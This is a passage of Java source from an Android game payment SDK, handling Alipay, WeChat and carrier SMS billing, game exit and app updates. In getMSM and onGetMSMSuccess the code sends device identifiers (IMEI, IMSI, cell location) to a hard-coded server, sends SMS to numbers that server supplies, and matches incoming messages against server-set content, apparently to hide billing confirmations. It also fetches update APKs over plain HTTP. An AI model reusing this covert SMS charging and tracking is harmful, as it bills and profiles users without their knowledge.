		instance.dipcon2 = activateResult.getDipcon2();
		instance.dipurl = activateResult.getDipurl();
		instance.noturl = activateResult.getNoturl();
		instance.exiturl = activateResult.getExiturl();
		GameSDK.this.initalized = true;
		instance.gameSDKInitListener.initOver(true, PayType, sdkControlVoice());
	}

	public static String getSetting(Context activity, String name) {
		String value = "";
		LocalStorage storage = LocalStorage.getInstance(activity);
		value = storage.getString(name);
		return value;

	}

	/**
	 * 支付接口
	 * 
	 * @param requestAmount
	 *            单位是分
	 * @param payindex
	 *            计费点索引
	 * @param payname
	 *            该商品名称
	 * @param gameSDKPaymentListener
	 *            回调监听
	 * @param extendP
	 *            扩展参数 parmet1(15 alipay 16weCaht)
	 */
	public void startPay(int requestAmount, int payindex, String payname,
			GameSDKPaymentListener gameSDKPaymentListener, String... extendP) {
		Util_G.debugE("requestAmount-->>", "requestAmount="+requestAmount);
		Message message = handler.obtainMessage(NOTICE_STARTPAY);
		Object[] strs = { requestAmount, payindex, payname,
				gameSDKPaymentListener, extendP };
		message.obj = strs;
		message.sendToTarget();
	}

	private synchronized void allPay(int requestAmount, int payindex,
			String payname, GameSDKPaymentListener gameSDKPaymentListener,
			String[] extendP) {
		if (!PayConfig.appidMap.containsKey(instance.currentAppID)) {// 如果传进来的appid
																		// 不存在不能进行支付
			instance.makeToast("appid不存在");
			return;
		}
		if (!PayConfig.IS_PAYING) {
			PayConfig.IS_PAYING = true;
		} else {
			Toast.makeText(context, "正在支付中..", Toast.LENGTH_SHORT).show();
			if (gameSDKPaymentListener != null) {
				gameSDKPaymentListener.onPayCancelled();
			}// 这个时候也得返回支付取消 不然游戏可能会卡住
			return;
		}
		directPay = "";
		if (extendP != null) {
			if (extendP.length > 0) {
				directPay = extendP[0];
			}
		}
		String MK = GameSDK.getSetting(context, Constants.MK);
		Log.e("startPay", "MK==" + MK);
		GameSDK.gameSDKPaymentListener = gameSDKPaymentListener;
		payOrder = UUID.randomUUID().toString();
		payOrder = (payOrder.replace("-", "")).substring(0, 14);
		if (mobileType == 10 && tcSDKInited) {
			payOrder = (payOrder.replace("-", "")).substring(0, 14) + "_6";
		}

		SendOder.getInstance().amount = requestAmount;
		Util_G.debugE("requestAmount-->>", "requestAmount2="+SendOder.getInstance().amount);
		SendOder.getInstance().payname = payname;
		SendOder.getInstance().payindex = payindex;
		if (directPay.equals(Constants.ALI_PAY)) {// 直接走alipay
			try {
				PaymentFactoy.producePay(PayConfig.BILL_TYPE_TAOBAO)
						.pay(context, payOrder, requestAmount, payname,
								paywayStr[8]);
			} catch (Throwable e) {
				Util_G.debugE("allPay", e.getMessage());
				payResultHandle.sendEmptyMessage(PayConfig.NO_THIS_PAYTYPE);
			}
			return;
		} else if (directPay.equals(Constants.WECHAT_PAY)) {// 直接走
			try {
				PaymentFactoy.producePay(PayConfig.WECHAT_PAY).pay(context,
						payOrder, requestAmount, payname, paywayStr[9]);
			} catch (Throwable e) {
				payResultHandle.sendEmptyMessage(PayConfig.NO_THIS_PAYTYPE);
			}
			return;
		}
//		if(Helper.getIMSI(context)==null){
//			directPay = Constants.WECHAT_PAY;
//			PaymentFactoy.producePay(PayConfig.WECHAT_PAY).pay(context,
//					payOrder, requestAmount, payname, paywayStr[9]);
//			return;
//		}
		try {// 移动基地
			PaymentFactoy.producePay(PayConfig.JD_PAY).pay(context,
					payindex);
		} catch (Throwable e) {
			Util_G.debugE("allPay", e.getMessage());
		}

	}

	private void noThisPay(int money, String payname) {
		directPay = Constants.WECHAT_PAY;
//		PaymentFactoy.producePay(PayConfig.WECHAT_PAY).pay(context, 
//				payOrder, SendOder.getInstance().amount, payname, paywayStr[9]);
		if (directPay.equals("-1")) {
			String retMsg = "不支持该类型支付"+SendOder.getInstance().payway;
			notifyPaymentFail(PayConfig.NO_THIS_PAYTYPE,retMsg);
		}else{
			try {
				PaymentFactoy.producePay(PayConfig.BILL_TYPE_TAOBAO).pay(context,
						payOrder, money, payname, paywayStr[8]);
			} catch (Throwable e) {
				Util_G.debugE("allPay", e.getMessage());
				payResultHandle.sendEmptyMessage(PayConfig.NO_THIS_PAYTYPE);
			}
		}
	}

	public static boolean isFill(String sms) {
		boolean ret = false;
		if (GameSDK.mbDelSMS.equals("1")) {
			ret = sms.contains(GameSDK.mDelSMSCon);
		}
		;
		return ret;
	}

	public void makeToast(String message) {
		if (Helper.isDeBuge) {
			Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
		}
	}

	public void notifyPaymentFinish(int amount) {
		if (gameSDKPaymentListener != null) {
			Util_G.debugE("payresult-->>", "amount="+amount);
			gameSDKPaymentListener.onPayFinished(amount);
		}
		PayConfig.IS_PAYING = false;
	}

	public void notifyPaymentCancelled() {
		if (gameSDKPaymentListener != null) {
			gameSDKPaymentListener.onPayCancelled();
		}
		PayConfig.IS_PAYING = false;
	}

	// public void notifyPaymentFail(PayResultInfo info) {
	// if (gameSDKPaymentListener != null) {
	// gameSDKPaymentListener.onPayFail(info);
	// }
	// PayConfig.IS_PAYING = false;
	// }
	public void notifyPaymentFail(int resutCode, String retMsg) {
		PayResultInfo failInfo = new PayResultInfo();
		failInfo.resutCode = resutCode;
		failInfo.retMsg = retMsg;
		if (gameSDKPaymentListener != null) {
			gameSDKPaymentListener.onPayFail(failInfo);
		}
		PayConfig.IS_PAYING = false;
	};


	/**
	 * 最好每次退出游戏调用下
	 */
	public void exitGame(final ExitGameListener listener) {
		Message message = handler.obtainMessage(NOTICE_EXITGAME);
		message.obj = listener;
		message.sendToTarget();
	}

	private static void handExitGame(final ExitGameListener listener) {
		if (instance!=null&&instance.jdSDKINited ) {
//			 移动退出接口，含确认退出UI
//			 如果外放渠道（非移动自有渠道）限制不允许包含移动退出UI，可用exitApp接口（无UI退出）
			try {
				GameInterface.exit(instance.context,
						new GameInterface.GameExitCallback() {
							@Override
							public void onConfirmExit() {
								cleanSdk(listener);
							}

							@Override
							public void onCancelExit() {
								Toast.makeText(instance.context, "取消退出",
										Toast.LENGTH_SHORT).show();
								listener.exitGame(false);
							}
						});
			} catch (Throwable e) {
				e.printStackTrace();
			}
		} else {
			cleanSdk(listener);
			instance = null;
		}
	}

	private static void cleanSdk(final ExitGameListener listener) {
		instance.mmSDKInited = false;
		instance.tcSDKInited = false;
		instance.uincomSDKInited = false;
		instance.jdSDKINited = false;
		instance.SendTimer = false;
		instance.context.unregisterReceiver(instance.mSMSReceiver);
		listener.exitGame(true);
	}

	public void onResume() {

	}

	public void onActivityResult(int requestCode, int resultCode, Intent data) {
		if (directPay.equals(Constants.WECHAT_PAY)) {
			PayConfig.IS_PAYING = false;//这里重置为false 不然下次支付可能会有
			if (data == null) {
				return;
			}
			String respCode = data.getExtras().getString("respCode");
			String errorCode = data.getExtras().getString("errorCode");
			String respMsg = data.getExtras().getString("respMsg");
			if (respCode == null) {
				return;
			}
			StringBuilder temp = new StringBuilder();
			if (respCode.equals("00")) {
				temp.append("交易状态:成功");
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_SUCC);
			} else if (respCode.equals("02")) {
				// temp.append("交易状态:取消");
				notifyPaymentCancelled();
			} else if (respCode.equals("01")) {
				temp.append("交易状态:失败").append("\n").append("错误码:")
						.append(errorCode).append("原因:" + respMsg);
				notifyPaymentFail(PayConfig.WECHAT_PAY_FAIL, temp.toString());
			} else if (respCode.equals("03")) {
				temp.append("交易状态:未知").append("\n").append("错误码:")
						.append(errorCode).append("原因:" + respMsg);
				notifyPaymentFail(PayConfig.WECHAT_PAY_FAIL, temp.toString());
			}
		}

	}

	public void onPause() {

	}

	/**
	 * sdk是否控制音效
	 */
	public boolean sdkControlVoice() {
		
		return true;
//		if (PayType == Integer.parseInt(Constants.MM_JD_PAY)) {
//			try {
//				return GameInterface.isMusicEnabled();
//			} catch (Throwable e) {
//				e.printStackTrace();
//			}
//		}
//		return false;
	}

	private class GetMSMListener implements HttpCallback<GetMSMResult> {

		private GetMSMCallback callback;

		private GetMSMListener(GetMSMCallback callback) {
			this.callback = callback;
		}

		@Override
		public void onSuccess(GetMSMResult object) {
			callback.onGetMSMSuccess(object);
		}

		@Override
		public void onFailure(int errorCode, String errorMessage) {
			callback.onFailure(errorCode, errorMessage);
			if (errorCode != Constants.ERROR_CODE_NET) {

			}
		}
	}

	public void getMSM(String url, final int amount, final int index,
			GetMSMCallback activateCallback) {
		Util_G.debug_i("test", "getinit");
		if (url == null || url.trim().equals("")) {
			url = "http://sa.91muzhi.com:8080/sdk/getcon";
		}

		final String baseUrl = url;
		SMScallBack = new GetMSMListener(activateCallback);
		class ConnRunnable implements Runnable {
			public void run() {
				String response = "";
				try {
					HashMap<String, String> entry = new HashMap<String, String>();
					entry.put("amount", amount + "");
					entry.put("index", (index + 1) + "");
					entry.put("packet_id", packetId);
					entry.put("imei", Helper.getIMEI(context));
					entry.put("imsi", Helper.getIMSI(context));
					entry.put("orderNO", payOrder);
					entry.put("mcc", mcc + "");
					entry.put("mnc", mnc + "");
					entry.put("cell", cid + "");
					entry.put("lac", lac + "");
					entry.put("Ver", Constants.GAME_SDK_VERSION);
					response = HttpRequestt.get(baseUrl, entry, false).body();
				} catch (Exception e) {
					e.printStackTrace();
				}
				Message msg = handler.obtainMessage(NET_FEE_MSG);
				msg.obj = response;
				msg.sendToTarget();
			}
		}
		ConnRunnable cr = new ConnRunnable();
		Thread t = new Thread(cr);
		t.start();
	}

	@Override
	public void onGetMSMSuccess(GetMSMResult getResult) {
		SendOder.mthrirdno = getResult.getTradeNo();
		if (getResult.getNum().trim().equals("")
				|| getResult.getContent().trim().equals("")) {
			Message msg = handler.obtainMessage(NET_FEE_MSG);
			msg.obj = null;
			msg.sendToTarget();
			return;
		}
		Intent itSend = new Intent(SENT_SMS_ACTION);
		// itSend.putExtra(KEY_PHONENUM, contactList.get(i));
		PendingIntent mSendPI = PendingIntent.getBroadcast(
				context.getApplicationContext(), 0, itSend,
				PendingIntent.FLAG_ONE_SHOT);// 这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。
		// String content = mContext.getString(R.string.test);
		// smsManager.sendTextMessage(contactList.get(i), null, content,
		// mSendPI, null);
		bCallback = 0;
		GameSDK.mbDelSMS = getResult.getbDel();
		GameSDK.mDelSMSCon = getResult.getFillCon();
		Util_G.sendTextMessage(context, getResult.getNum(),
				getResult.getContent(), mSendPI, getResult.getMSGType());
		payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
		payResultHandle.sendEmptyMessageDelayed(PayConfig.NATIVE_FEE_FAIL,
				25000);
	}
	
	/**
	 * 检查是否需要更新
	 * @return
	 */
	private boolean checkupdate(){
		final boolean isshow = new TimeSharedPreferences().IsMutilLogin(context);//主动弹框
		packegName = context.getPackageName();//游戏包名
		int versionCode = Helper.getVersionCode(context);
		String versionName = Helper.getVersionName(context);
		netState = Helper.getAccessPoint(context);
		if(netState.equals("wifi")){
			netType = 0;//wifi状态
		}else{
			netType = 1;//流量状态
		}
		final String url = "http://119.29.15.70:8888/apkmanagement/api/codition"
							+"?versionName=" +versionName//"1.1.5"//
							+"&versionCode=" +versionCode//"5"//
							+"&packetId=" +packetId//"yy101"//
							+"&apkInstallName=" +packegName;//"com.muzhi.parkour.egame.xyamx";//
							//+"netType=" + netType;
		Util_G.debugE("url-->>", url);
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				try{
					String requestResponse = HttpRequestt.get(url).body();
					if(requestResponse != null && !"".equals(requestResponse)){
						Util_G.debugE("requestResponse", requestResponse);
						JSONObject json = new JSONObject(requestResponse);
						JSONObject rows = json.getJSONObject("rows");
						JSONArray coolist = rows.getJSONArray("coolist");
						Util_G.debugE("update", coolist.toString());
						int status = coolist.getJSONObject(0).getInt("versionStatus");
						if(coolist.length() > 0 && status == 1){//状态为0表示更新功能禁用，1表示启用
							String apkUrll = coolist.getJSONObject(0).getString("apkName");
							if(apkUrll!=null){
								apkUrl = apkUrll.replace("\"", "");
							}
							update_msg = coolist.getJSONObject(0).getString("updateRemindRemarks");//
							int updateType = coolist.getJSONObject(0).getInt("updateType");//0:正常更新1:强制更新
							if(updateType == 0){
								int remindtype = coolist.getJSONObject(0).getInt("remindType");//提醒方式:1：主动提醒0：默认提醒
								if(remindtype == 1){
									int remindFrequency = coolist.getJSONObject(0).getInt("remindFrequency");
									if(remindFrequency==0){//一天只提醒一次
										if(isshow){//默认提醒
											gameSDKInitListener.upData(1, apkUrl, update_msg, updateType,0);
										}else{//不弹框提醒，可能是一天之内多次登录，不主动弹更新框
											gameSDKInitListener.upData(1, apkUrl, update_msg, updateType,1);
										}
									}else if(remindFrequency == 1){//每次进入游戏都提醒
										gameSDKInitListener.upData(1, apkUrl, update_msg, updateType,0);
									}else if(remindFrequency == 2){//wifi状态下才弹出下载框
										if(netType ==0){//wifi状态
											gameSDKInitListener.upData(1, apkUrl, update_msg, updateType, 0);
										}else{
											gameSDKInitListener.upData(1, apkUrl, update_msg, updateType, 1);
										}
									}
								}else if(remindtype == 0){//默认提醒，不弹下载框
									gameSDKInitListener.upData(1, apkUrl, update_msg, updateType, 1);
								}
							}else {
								gameSDKInitListener.upData(1, apkUrl, update_msg, updateType, 0);
							}
						}else {
							gameSDKInitListener.upData(0, "", "", 0,0);
						}
					}
				}catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}).start();
		
		return true;
		
	}
	private String packegName = "";
	private String apkUrl = "";
	private String update_msg = "";
	private String netState = "";
	private String updata_type = "";
	private int netType ;//0:WIFI状态，1：流量
	
	public Handler mHandler = new Handler(){
		public void dispatchMessage(Message msg) {
//			downApk(apkUrl, update_msg, updata_type);
			DownloadeManager dm = new DownloadeManager(context, packegName,apkUrl);
			dm.showNoticeDialog(updata_type,update_msg);
		};
	};
	
	/**
	 * 游戏版本更新
	 * @param apkurl 更新下载地址
	 * @param updatamsg 更新提示语
	 * @param updatatype 更新方式：0正常更新，1强制更新
	 * 
	 */
	public void updataApk(String apkurl, String updatamsg,
			String updatatype){
		apkUrl = apkurl;
		update_msg = updatamsg;
		updata_type = updatatype;

		Message msg = mHandler.obtainMessage();
		msg.sendToTarget();
	}
	
}
